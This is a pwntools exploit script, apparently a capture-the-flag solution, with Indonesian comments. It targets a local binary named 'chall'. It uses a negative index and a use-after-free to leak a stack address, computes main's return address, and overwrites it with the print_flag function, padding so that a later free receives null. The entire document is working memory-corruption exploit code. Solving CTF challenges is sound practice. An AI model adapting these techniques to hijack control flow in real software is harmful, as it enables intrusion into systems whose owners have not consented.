from pwn import *

p=process("./chall")
# p=remote("127.0.0.1",10022)
elf=context.binary=ELF("./chall",checksec=False)

# Leak stack (buffer) address
# pause()
p.sendline("1")
p.sendline("-568") # nilai ini didapat dari offset frist_buf ke pointer yang mengarah ke last freed chunk
p.sendline(b"\x60") # kita ingin agar chunk yang mengandung leak dari array agar digunakan ketika malloc ; UAF
p.recvuntil("kamu: ")
stack = int(p.recvline().strip().decode(), 16)
info("leaked stack address: %#x", stack)

# offset ke return address = karena Stack[-0x88]:  local_88
ret = stack + 136
info("return address: %#x", ret)


# tambahkan padding 0 karena kita nanti akan menggunakan opsi 3 yang menggeser pointer maju 8 bytes 
# lalu taruh alamat yang menyimpan return address dari main yang diketahui dari leak array
p.sendlineafter(">> ",b'2')
p.sendlineafter("sesuatu: ",flat([0, ret]))
p.sendlineafter(">> ",b'3')


# # karena tadi pointer sudah mengarah ke alamat yang menyimpan ret addr main, kita bisa menulis fungsi print_flag
# # kita juga tambahkan padding 0 karena ketika ingin return dari main, program akan free dan kita ingin free (0)
p.sendlineafter(">> ",b'2')

# p.sendline(flat([elf.functions.print_flag, 0]))
p.sendlineafter("sesuatu: ",flat([elf.functions.print_flag, 0]))

# # geser lagi agar nanti free(-)
p.sendlineafter(">> ",b'3')

p.sendline(b'1949')
p.interactive()